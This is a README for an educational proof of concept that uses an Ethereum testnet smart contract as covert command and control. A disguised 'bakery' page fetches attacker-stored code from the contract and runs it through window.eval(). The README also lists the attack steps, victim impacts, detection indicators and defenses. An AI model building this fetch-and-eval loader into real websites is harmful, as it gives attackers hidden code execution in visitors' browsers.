# Blockchain-Based Command & Control (C2) Demonstration

## ⚠️ Educational Purpose Only

This project is provided **strictly for educational and authorized security research purposes**. Unauthorized command and control systems are illegal. This is a proof-of-concept demonstration of how blockchain technology could theoretically be abused for malicious purposes.

## Overview

**Blockchain-C2-Demo** is an educational demonstration of how a blockchain-based smart contract could be misused as a command and control infrastructure. It shows how an attacker could:

1. Store arbitrary commands/code in a blockchain smart contract
2. Have compromised victim machines automatically execute those commands
3. Evade traditional C2 detection by using blockchain as a communication channel

## What is C2 (Command & Control)?

Command & Control (C2) infrastructure is used to send commands to and receive data from compromised systems. Traditional C2 systems rely on:
- Direct server-client connections
- DNS tunneling
- HTTP/HTTPS callbacks
- P2P networks

This proof-of-concept explores a **blockchain-based alternative** where commands are stored immutably on a smart contract.

## Architecture

### Components

#### 1. **Smart Contract** (`blockChainC2.sol`)
- Solidity smart contract deployed on Ethereum Sepolia testnet
- Stores arbitrary byte data (commands/code)
- Owner-only write access (attacker controls)
- Public read access (victims can fetch commands)
- Contract Address: `0x0000000000000000000000000000000000000000` (Replace with your deployed testnet contract address)

**Contract Functions:**
```solidity
setBytes(bytes data)      // Owner stores command/code
getBytes() returns(bytes) // Anyone retrieves command/code
getSize() returns(uint256)// Get command size
```

#### 2. **Attacker Interface** (`AttackerInterface.html`)
- Web-based interface for the attacker
- ASCII to Hex converter (encodes commands)
- MetaMask integration for blockchain interaction
- Allows attacker to upload malicious code to the contract
- Only owner (attacker) can successfully call `setBytes()`

**Features:**
- ASCII text to hexadecimal conversion
- MetaMask wallet connection
- Direct contract interaction via ethers.js
- Send arbitrary bytecode to blockchain

#### 3. **Victim Page** (`victim.html`)
- Innocent-looking website (fake bakery: "Yummy Cakes")
- Embedded malicious JavaScript
- Automatically connects to the blockchain
- Fetches commands from the C2 contract
- Executes fetched code using `window.eval()`
- Uses Sepolia testnet RPC endpoint

**Attack Flow:**
```javascript
// Victim's browser automatically:
const blob = await contract.getBytes()           // Fetch command
window.eval(ethers.toUtf8String(blob))          // Execute it
```

#### 4. **JavaScript Application** (`app.js`)
- Module-based application logic
- ethers.js library for blockchain interaction
- Handles MetaMask connection
- Manages contract read/write operations
- Converts between ASCII and hexadecimal

## Attack Flow

```
1. Attacker creates malicious JavaScript/code
2. Attacker converts code to hex format
3. Attacker connects MetaMask wallet
4. Attacker uploads hex code to smart contract via setBytes()
5. Code is stored immutably on blockchain
6. Victim visits attacker's website (victim.html)
7. Victim's browser automatically fetches code from contract
8. Code is decoded from hex to string
9. Code is executed in victim's browser via window.eval()
10. Attacker's commands execute with victim's browser privileges
```

## How It Works

### Step 1: Attacker Setup
```
1. Deploy smart contract to blockchain
2. Set yourself as owner
3. Host attacker interface (AttackerInterface.html)
4. Create commands/malicious code
```

### Step 2: Command Upload
```javascript
// Attacker uses interface to:
- Input: "malicious JavaScript code"
- Convert to hex
- Connect MetaMask
- Call setBytes(0x[hex_code])
```

### Step 3: Victim Compromise
```
1. Victim visits legitimate website with embedded script
2. Script loads victim.html or embedded C2 code
3. Browser connects to Sepolia testnet RPC
4. Calls contract.getBytes() to fetch commands
5. Executes fetched code via eval()
```

### Step 4: Command Execution
```javascript
// Victim's browser executes attacker's code with privileges like:
- Access to page cookies and local storage
- Ability to perform actions on victim's behalf
- Access to browser's built-in APIs
- Potential for further exploitation
```

## Files Breakdown

| File | Purpose |
|------|---------|
| `blockChainC2.sol` | Solidity smart contract for storing commands |
| `AttackerInterface.html` | Attacker's web interface to upload commands |
| `victim.html` | Innocent website with embedded malicious C2 code |
| `app.js` | JavaScript module handling blockchain interaction |

## Deployment

### Prerequisites
- MetaMask browser extension
- Sepolia ETH (testnet, free from faucets)
- Solidity compiler (for contract deployment)

### Getting Sepolia ETH (Free Testnet Funds)

You need ETH on Sepolia testnet to deploy. Get free ETH from these faucets:

- **Alchemy Sepolia Faucet**: https://sepoliafaucet.com/ (requires Alchemy account)
- **Quicknode Faucet**: https://faucet.quicknode.com/ethereum/sepolia
- **Infura Faucet**: https://www.infura.io/faucet/sepolia
- **Chainlink Faucet**: https://faucets.chain.link/ (requires GitHub login)

## Security Concerns & Why This Is Dangerous

### Blockchain Advantages for Attacker:
- **Immutability**: Commands persist permanently on-chain
- **Decentralization**: No single server to take down
- **Transparency**: But also allows anyone to see commands
- **Resilience**: Survives typical C2 takedowns
- **Evasion**: Bypasses traditional C2 detection

### Victim Impact:
- **Session Hijacking**: Steal authentication tokens
- **Credential Theft**: Capture user credentials
- **Malware Distribution**: Download and execute files
- **Cryptojacking**: Use browser to mine cryptocurrency
- **Data Exfiltration**: Steal sensitive information
- **Keylogging**: Record user keystrokes

## Detection & Defense

### Detection Indicators:
- Unusual connections to blockchain RPC endpoints
- Execution of eval() with fetched remote data
- MetaMask interactions on unexpected sites
- Cryptographic signatures on blockchain
- Suspicious bytecode in smart contracts

### Defense Mechanisms:
- **CSP (Content Security Policy)**: Disable eval()
- **WAF Rules**: Block eval() execution
- **Endpoint Detection**: Monitor blockchain connections
- **Network Segmentation**: Restrict RPC access
- **User Education**: Warn about malicious websites
- **Browser Extensions**: Block unauthorized scripts

### Network-Level Defense:
```
Block blockchain RPC endpoints (etherscan, infura, etc.)
Monitor for unsigned JavaScript execution
Implement strict CSP policies
Use Web Application Firewalls
```

## Proof of Concept Limitations

This PoC demonstrates **one possible approach** but has limitations:

1. **Public Visibility**: All commands visible on blockchain
2. **Cost**: Every command costs transaction fees
3. **Latency**: Blockchain confirmation times (12+ seconds)
4. **Scale**: Limited to JavaScript in web browsers
5. **Detection**: Behavior is detectable with monitoring
6. **Forensics**: Immutable proof of attack on blockchain

## Real-World Implications

This concept illustrates:
- How Web3/blockchain could be abused
- Why `eval()` is dangerous
- Importance of input validation
- Risks of third-party code execution
- Need for Content Security Policy

## Educational Value

This project teaches:
- Solidity smart contract development
- ethers.js library usage
- Web3 security vulnerabilities
- Attack vector complexity
- Defense-in-depth principles

## Ethical Considerations

This code demonstrates a **proof-of-concept attack**:
- ✅ For authorized security research
- ✅ In controlled sandbox environments
- ✅ For educational institutions
- ✅ For authorized penetration testing

- ❌ Do NOT deploy targeting real users
- ❌ Do NOT use for unauthorized access
- ❌ Do NOT deploy on mainnet (costs real money)
- ❌ Do NOT hide malicious intent from victims

## Legal Disclaimer

**IMPORTANT**: Unauthorized access to computer systems is illegal. This code is provided for:

- Educational purposes only
- Learning about blockchain security
- Authorized penetration testing
- Security research in controlled environments
- University coursework

## References

- [MITRE ATT&CK: Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [Solidity Documentation](https://docs.soliditylang.org/)
- [ethers.js Documentation](https://docs.ethers.org/)
- [Ethereum Security Best Practices](https://ethereum.org/en/developers/docs/security/)
- [Web3 Security Considerations](https://www.web3security.org/)

## Related Topics to Study

- Smart contract security vulnerabilities
- Frontend security and XSS prevention
- Blockchain analysis and forensics
- Content Security Policy (CSP)
- Browser-based malware analysis

## Disclaimer

Users of this code are solely responsible for ensuring compliance with all applicable laws and regulations. Unauthorized system access is a serious crime. This project is **strictly for educational and authorized security research purposes only**.

## License

Educational use only. Not for commercial or malicious purposes.

---

**Created for educational security research purposes.**  
**Last Updated**: 2026  
**Purpose**: Teaching blockchain security vulnerabilities and defensive techniques
